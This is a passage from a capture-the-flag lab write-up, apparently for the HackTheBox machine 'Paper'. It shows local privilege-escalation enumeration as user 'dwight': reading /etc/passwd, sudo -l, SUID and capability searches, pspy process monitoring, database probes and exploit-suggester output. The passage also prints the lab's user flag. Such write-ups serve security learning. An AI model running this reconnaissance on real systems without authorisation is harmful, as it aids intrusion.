+</span><span class="z-text z-plain">    link/ether 52:54:00:9b:e7:f7 brd ff:ff:ff:ff:ff:ff
+</span></code></pre>
+<p>So there's the loopback interface, the Ethernet interface, and the mysterious <code>virbr0</code> and <code>virbr0-nic</code> interfaces.</p>
+<p>If we serach online, we find that these interfaces are created by <code>libvirt</code>, and are used by VMs to connect to the outside network.</p>
+<h2 id="hostname">Hostname</h2>
+<p>What is Paper's hostname?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ hostname</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">paper
+</span></code></pre>
+<p>Yeah I know, very surprising.</p>
+<h2 id="local-users">Local users</h2>
+<p>Let's enumerate all the local users that have a console.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ cat /etc/passwd</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>sh$<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span>:<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f1</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">root
+</span><span class="z-text z-plain">rocketchat
+</span><span class="z-text z-plain">dwight
+</span></code></pre>
+<p>Interesting! So apart from us and <code>root</code>, there's also a <code>rocketchat</code> user.</p>
+<h2 id="local-groups">Local groups</h2>
+<p>Let's retrieve the list of all local groups.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ getent group</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">cut</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span>:<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f1</span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sort</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">adm
+</span><span class="z-text z-plain">apache
+</span><span class="z-text z-plain">audio
+</span><span class="z-text z-plain">avahi
+</span><span class="z-text z-plain">bin
+</span><span class="z-text z-plain">brlapi
+</span><span class="z-text z-plain">cdrom
+</span><span class="z-text z-plain">chrony
+</span><span class="z-text z-plain">clevis
+</span><span class="z-text z-plain">cockpit-ws
+</span><span class="z-text z-plain">colord
+</span><span class="z-text z-plain">daemon
+</span><span class="z-text z-plain">dbus
+</span><span class="z-text z-plain">dialout
+</span><span class="z-text z-plain">disk
+</span><span class="z-text z-plain">dnsmasq
+</span><span class="z-text z-plain">dwight
+</span><span class="z-text z-plain">floppy
+</span><span class="z-text z-plain">ftp
+</span><span class="z-text z-plain">games
+</span><span class="z-text z-plain">gdm
+</span><span class="z-text z-plain">geoclue
+</span><span class="z-text z-plain">gluster
+</span><span class="z-text z-plain">gnome-initial-setup
+</span><span class="z-text z-plain">input
+</span><span class="z-text z-plain">insights
+</span><span class="z-text z-plain">kmem
+</span><span class="z-text z-plain">kvm
+</span><span class="z-text z-plain">libstoragemgmt
+</span><span class="z-text z-plain">libvirt
+</span><span class="z-text z-plain">lock
+</span><span class="z-text z-plain">lp
+</span><span class="z-text z-plain">mail
+</span><span class="z-text z-plain">man
+</span><span class="z-text z-plain">mem
+</span><span class="z-text z-plain">mongod
+</span><span class="z-text z-plain">mysql
+</span><span class="z-text z-plain">nginx
+</span><span class="z-text z-plain">nobody
+</span><span class="z-text z-plain">pegasus
+</span><span class="z-text z-plain">pipewire
+</span><span class="z-text z-plain">polkitd
+</span><span class="z-text z-plain">printadmin
+</span><span class="z-text z-plain">pulse
+</span><span class="z-text z-plain">pulse-access
+</span><span class="z-text z-plain">pulse-rt
+</span><span class="z-text z-plain">qemu
+</span><span class="z-text z-plain">radvd
+</span><span class="z-text z-plain">render
+</span><span class="z-text z-plain">rocketchat
+</span><span class="z-text z-plain">root
+</span><span class="z-text z-plain">rpc
+</span><span class="z-text z-plain">rpcuser
+</span><span class="z-text z-plain">rtkit
+</span><span class="z-text z-plain">saslauth
+</span><span class="z-text z-plain">setroubleshoot
+</span><span class="z-text z-plain">slocate
+</span><span class="z-text z-plain">ssh_keys
+</span><span class="z-text z-plain">sshd
+</span><span class="z-text z-plain">sssd
+</span><span class="z-text z-plain">sys
+</span><span class="z-text z-plain">systemd-coredump
+</span><span class="z-text z-plain">systemd-journal
+</span><span class="z-text z-plain">systemd-resolve
+</span><span class="z-text z-plain">tape
+</span><span class="z-text z-plain">tcpdump
+</span><span class="z-text z-plain">tss
+</span><span class="z-text z-plain">tty
+</span><span class="z-text z-plain">unbound
+</span><span class="z-text z-plain">usbmuxd
+</span><span class="z-text z-plain">users
+</span><span class="z-text z-plain">utempter
+</span><span class="z-text z-plain">utmp
+</span><span class="z-text z-plain">video
+</span><span class="z-text z-plain">wheel
+</span></code></pre>
+<p>That's pretty classic.</p>
+<h2 id="user-account-information">User account information</h2>
+<p>Let's see to which groups we currently belong</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ groups</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">dwight
+</span></code></pre>
+<p>We only belong to the default group for our user.</p>
+<h2 id="home-folder">Home folder</h2>
+<p>We aleady began the exploration of our home folder earlier, and we noticed the user flag file. Let's retrieve its content.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ cat <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>/user.txt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">59f70e475e39973568acabb293df37c9
+</span></code></pre>
+<h2 id="command-history">Command history</h2>
+<p>We can try to check the history of the commands our user ran, but it's discarded into <code>/dev/null</code>.</p>
+<h2 id="sudo-permissions">Sudo permissions</h2>
+<p>Let's see if we can execute anything as another user with <code>sudo</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ sudo<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>l</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Sorry, user dwight may not run sudo on paper.
+</span></code></pre>
+<p>Well, no luck here.</p>
+<h2 id="environment-variables">Environment variables</h2>
+<p>Let's check the environment variables for our shell. Maybe we'll find something out of the ordinary?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ env</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">LS_COLORS=rs=0:di=38;5;33:ln=38;5;51:mh=00:pi=40;38;5;11:so=38;5;13:do=38;5;5:bd=48;5;232;38;5;11:cd=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=01;05;37;41:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;40:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.zst=38;5;9:*.tzst=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.wim=38;5;9:*.swm=38;5;9:*.dwm=38;5;9:*.esd=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.mjpg=38;5;13:*.mjpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.m4a=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.oga=38;5;45:*.opus=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:
+</span><span class="z-text z-plain">SSH_CONNECTION=10.10.14.9 42630 10.10.11.143 22
+</span><span class="z-text z-plain">LANG=C.UTF-8
+</span><span class="z-text z-plain">HISTCONTROL=ignoredups
+</span><span class="z-text z-plain">HOSTNAME=paper
+</span><span class="z-text z-plain">which_declare=declare -f
+</span><span class="z-text z-plain">XDG_SESSION_ID=3
+</span><span class="z-text z-plain">USER=dwight
+</span><span class="z-text z-plain">PWD=/home/dwight
+</span><span class="z-text z-plain">HOME=/home/dwight
+</span><span class="z-text z-plain">SSH_CLIENT=10.10.14.9 42630 22
+</span><span class="z-text z-plain">XDG_DATA_DIRS=/home/dwight/.local/share/flatpak/exports/share:/var/lib/flatpak/exports/share:/usr/local/share:/usr/share
+</span><span class="z-text z-plain">SSH_TTY=/dev/pts/0
+</span><span class="z-text z-plain">MAIL=/var/spool/mail/dwight
+</span><span class="z-text z-plain">TERM=xterm-256color
+</span><span class="z-text z-plain">SHELL=/bin/bash
+</span><span class="z-text z-plain">TC_LIB_DIR=/usr/lib64/tc
+</span><span class="z-text z-plain">SHLVL=1
+</span><span class="z-text z-plain">LOGNAME=dwight
+</span><span class="z-text z-plain">DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1004/bus
+</span><span class="z-text z-plain">XDG_RUNTIME_DIR=/run/user/1004
+</span><span class="z-text z-plain">PATH=/home/dwight/.local/bin:/home/dwight/bin:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin
+</span><span class="z-text z-plain">HISTSIZE=1000
+</span><span class="z-text z-plain">LESSOPEN=||/usr/bin/lesspipe.sh %s
+</span><span class="z-text z-plain">BASH_FUNC_which%%=() {  ( alias;
+</span><span class="z-text z-plain"> eval ${which_declare} ) | /usr/bin/which --tty-only --read-alias --read-functions --show-tilde --show-dot &quot;$@&quot;
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">_=/usr/bin/env
+</span></code></pre>
+<p>The <code>LESSOPEN</code> and <code>BASH_FUNC_which%%</code> environment variables are unusual, but that's all. I'm not sure how they can be useful to reach <code>root</code>, so let's move on.</p>
+<h2 id="listening-ports">Listening ports</h2>
+<p>Let's see if any TCP local ports are listening for connections.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ ss<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>tln</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">State                       Recv-Q                      Send-Q                                           Local Address:Port                                             Peer Address:Port                      Process                      
+</span><span class="z-text z-plain">LISTEN                      0                           128                                                  127.0.0.1:48320                                                 0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           128                                                  127.0.0.1:8000                                                  0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           70                                                   127.0.0.1:33060                                                 0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           128                                                  127.0.0.1:27017                                                 0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           128                                                  127.0.0.1:3306                                                  0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           32                                               192.168.122.1:53                                                    0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           128                                                    0.0.0.0:22                                                    0.0.0.0:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           128                                                          *:443                                                         *:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           128                                                          *:80                                                          *:*                                                      
+</span><span class="z-text z-plain">LISTEN                      0                           128                                                       [::]:22                                                       [::]:*
+</span></code></pre>
+<p>There's a few ports listening locally, including <code>27017/tcp</code> corresponding to MongoDB and <code>3306/tcp</code> corresponding to MySQL.</p>
+<p>MongoDB must be used by Rocket.Chat as we've seen earlier, but MySQL is definitely intriguing.</p>
+<p>Let's check UDP open ports too.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ ss<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>uln</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">State                       Recv-Q                      Send-Q                                            Local Address:Port                                            Peer Address:Port                      Process                      
+</span><span class="z-text z-plain">UNCONN                      0                           0                                                0.0.0.0%virbr0:67                                                   0.0.0.0:*                                                      
+</span><span class="z-text z-plain">UNCONN                      0                           0                                                       0.0.0.0:5353                                                 0.0.0.0:*                                                      
+</span><span class="z-text z-plain">UNCONN                      0                           0                                                     127.0.0.1:323                                                  0.0.0.0:*                                                      
+</span><span class="z-text z-plain">UNCONN                      0                           0                                                       0.0.0.0:42368                                                0.0.0.0:*                                                      
+</span><span class="z-text z-plain">UNCONN                      0                           0                                                 192.168.122.1:53                                                   0.0.0.0:*                                                      
+</span><span class="z-text z-plain">UNCONN                      0                           0                                                          [::]:5353                                                    [::]:*                                                      
+</span><span class="z-text z-plain">UNCONN                      0                           0                                                         [::1]:323                                                     [::]:*                                                      
+</span><span class="z-text z-plain">UNCONN                      0                           0                                                          [::]:36878                                                   [::]:*
+</span></code></pre>
+<p>The only locally open UDP port is <code>323/udp</code>. What could it be?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ cat /etc/services</span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">grep</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>E</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>\b323/udp\b<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<p>There's no output, this port is unknown. Let's try to interact with it:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ nc 127.0.0.1 323</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Ncat: Connection refused.
+</span></code></pre>
+<p>We can't interact with it. Let's move on then!</p>
+<h2 id="mongodb-port-27017-tcp">MongoDB (port <code>27017/tcp</code>)</h2>
+<p>Let's enumerate the MongoDB instance running on Paper.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ mongo</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">MongoDB shell version v4.0.27
+</span><span class="z-text z-plain">connecting to: mongodb://127.0.0.1:27017/test?gssapiServiceName=mongodb
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">rs01:PRIMARY&gt;
+</span></code></pre>
+<h3 id="databases">Databases</h3>
+<p>Let's see which databases are stored in this MongoDB instance.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">rs01:PRIMARY</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> show dbs</span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span>
+</span></code></pre>
+<p>No output... so this instance doesn't contain any database.</p>
+<h2 id="mysql-port-3306-tcp">MySQL (port <code>3306/tcp</code>)</h2>
+<p>We also noticed that the port <code>3306/tcp</code> was open, which probably means that a MySQL instance is running on Paper. Let's explore it!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ mysql</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">ERROR 1045 (28000): Access denied for user &#39;dwight&#39;@&#39;localhost&#39; (using password: NO)
+</span></code></pre>
+<p>We can't connect without using a password.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ mysql<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Enter password: 
+</span><span class="z-text z-plain">ERROR 1045 (28000): Access denied for user &#39;dwight&#39;@&#39;localhost&#39; (using password: YES)
+</span></code></pre>
+<p>Even if we enter the password we got earlier, we get a 'Access denied' message.</p>
+<p>I also tried to connect using <code>root</code> as the username, but it still doesn't work.</p>
+<h2 id="processes">Processes</h2>
+<p>Let's use <code>pspy</code> to see which processes are running on Paper.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ /tmp/pspy</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">2023/12/16 03:17:08 CMD: UID=1004  PID=3208   | /bin/bash /home/dwight/bot_restart.sh
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">2023/12/16 03:17:28 CMD: UID=1004  PID=3219   | /bin/bash /home/dwight/bot_restart.sh
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">2023/12/16 03:17:48 CMD: UID=1004  PID=3243   | /bin/bash /home/dwight/bot_restart.sh
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It looks like there's a cronjob that executes <code>/bin/bash /home/dwight/bot_restart.sh</code> every 20 seconds. But we already explored this script earlier, it just restarts the <code>recyclops</code> bot and cleans the log files. We can't leverage that to get <code>root</code>, so there must be another way.</p>
+<h2 id="suid-binaries">SUID binaries</h2>
+<p>Let's look for SUID binaries.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ find /<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>perm</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>4000</span> <span class="z-constant z-numeric z-integer z-decimal z-file-descriptor z-shell">2</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span>/dev/null</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/usr/bin/fusermount
+</span><span class="z-text z-plain">/usr/bin/chage
+</span><span class="z-text z-plain">/usr/bin/gpasswd
+</span><span class="z-text z-plain">/usr/bin/newgrp
+</span><span class="z-text z-plain">/usr/bin/mount
+</span><span class="z-text z-plain">/usr/bin/su
+</span><span class="z-text z-plain">/usr/bin/umount
+</span><span class="z-text z-plain">/usr/bin/crontab
+</span><span class="z-text z-plain">/usr/bin/passwd
+</span><span class="z-text z-plain">/usr/bin/chfn
+</span><span class="z-text z-plain">/usr/bin/chsh
+</span><span class="z-text z-plain">/usr/bin/at
+</span><span class="z-text z-plain">/usr/bin/sudo
+</span><span class="z-text z-plain">/usr/bin/fusermount3
+</span><span class="z-text z-plain">/usr/sbin/grub2-set-bootflag
+</span><span class="z-text z-plain">/usr/sbin/pam_timestamp_check
+</span><span class="z-text z-plain">/usr/sbin/unix_chkpwd
+</span><span class="z-text z-plain">/usr/sbin/userhelper
+</span><span class="z-text z-plain">/usr/sbin/mount.nfs
+</span><span class="z-text z-plain">/usr/lib/polkit-1/polkit-agent-helper-1
+</span><span class="z-text z-plain">/usr/libexec/dbus-1/dbus-daemon-launch-helper
+</span><span class="z-text z-plain">/usr/libexec/qemu-bridge-helper
+</span><span class="z-text z-plain">/usr/libexec/cockpit-session
+</span><span class="z-text z-plain">/usr/libexec/sssd/krb5_child
+</span><span class="z-text z-plain">/usr/libexec/sssd/ldap_child
+</span><span class="z-text z-plain">/usr/libexec/sssd/proxy_child
+</span><span class="z-text z-plain">/usr/libexec/sssd/selinux_child
+</span><span class="z-text z-plain">/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
+</span><span class="z-text z-plain">/usr/libexec/Xorg.wrap
+</span></code></pre>
+<p>Unfortunately, there's nothing that we can abuse to escalate our privileges.</p>
+<h2 id="capabilities">Capabilities</h2>
+<p>Let's see which files have special capabilities.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ find /<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>type</span> f<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>exec</span> getcap <span class="z-meta z-group z-expansion z-brace z-shell"><span class="z-punctuation z-section z-expansion z-brace z-begin z-shell">{</span><span class="z-punctuation z-section z-expansion z-brace z-end z-shell">}</span></span> <span class="z-constant z-character z-escape z-shell">\;</span> <span class="z-constant z-numeric z-integer z-decimal z-file-descriptor z-shell">2</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span>/dev/null</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/usr/bin/newgidmap = cap_setgid+ep
+</span><span class="z-text z-plain">/usr/bin/newuidmap = cap_setuid+ep
+</span><span class="z-text z-plain">/usr/bin/ping = cap_net_admin,cap_net_raw+p
+</span><span class="z-text z-plain">/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+</span><span class="z-text z-plain">/usr/sbin/arping = cap_net_raw+p
+</span><span class="z-text z-plain">/usr/sbin/clockdiff = cap_net_raw+p
+</span><span class="z-text z-plain">/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+</span><span class="z-text z-plain">/usr/sbin/mtr-packet = cap_net_raw+ep
+</span><span class="z-text z-plain">/usr/libexec/mysqld = cap_sys_nice+ep
+</span></code></pre>
+<p>Nothing that could be useful to get <code>root</code>.</p>
+<h2 id="les">LES</h2>
+<p>Alright, I guess it's time to check for CVEs that might affect this box. Let's use <a href="https://github.com/The-Z-Labs/linux-exploit-suggester">LES</a> for that!</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">[dwight@paper</span></span><span class="z-meta z-function-call z-arguments z-shell"> <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>]$ /tmp/linux-exploit-suggester.sh</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Possible Exploits:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+</span><span class="z-text z-plain">https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
+</span><span class="z-text z-plain">   Exposure: less probable
+</span><span class="z-text z-plain">   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
